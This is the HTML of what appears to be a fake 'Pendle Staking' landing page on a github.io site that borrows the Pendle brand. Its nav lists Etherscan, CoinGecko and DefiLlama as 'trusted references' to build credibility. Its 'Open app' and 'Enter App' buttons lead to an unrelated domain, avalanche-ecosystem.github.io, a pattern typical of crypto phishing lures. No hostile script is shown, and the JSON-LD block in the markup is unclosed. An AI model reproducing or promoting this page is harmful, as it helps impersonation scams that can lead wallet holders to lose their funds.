  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Pendle Staking">
  <meta name="twitter:description" content="Pendle Staking lets you lock PENDLE for vePENDLE to earn protocol rewards from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://pendle-staking.github.io/#website",
        "url": "https://pendle-staking.github.io/",
        "name": "Pendle Staking",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://pendle-staking.github.io/#organization",
        "name": "Pendle",
        "url": "https://pendle.finance/"
      },
      {
        "@type": "WebApplication",
        "@id": "https://pendle-staking.github.io/#app",
        "name": "Pendle Staking",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://pendle-staking.github.io/"
      }

<body>
  <header class="topbar">
    <a class="brand" href="#">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Pendle Staking</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/token/0x808507121B80c02388fAd14726482e061B8da827" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://www.coingecko.com/en/coins/pendle" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
      <a href="https://defillama.com/protocol/pendle" target="_blank" rel="nofollow noopener noreferrer">DefiLlama</a>
    </nav>
    <span class="sp"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <h1>Pendle Staking</h1>
    <p class="sub"><strong>Pendle Staking</strong> lets you lock PENDLE for vePENDLE to earn protocol rewards from your own wallet.</p>

    <section class="card" aria-label="Pendle staking route">
      <div class="route">
        <div class="leg">
          <span class="lbl">Stake</span>
          <span class="chip">
            <img class="ic" src="pendle.png" width="28" height="28" alt="PENDLE">
            <span class="t">PENDLE</span>
          </span>
        </div>
        <button class="dir" type="button" data-dir aria-label="Switch staking direction">
          <span class="ar" aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="lbl">Receive</span>
          <span class="chip">
            <img class="ic" src="pendle.png" width="28" height="28" alt="vePENDLE">
            <span class="t">vePENDLE</span>
          </span>
        </div>
      </div>
      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="foot">
    <b>Pendle Staking</b> &mdash; 2026
  </footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-dir]");
    if (!button) return;
    button.addEventListener("click", function(){
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
      button.classList.toggle("is-switched");
    });
  })();
  </script>
</body>
</html>
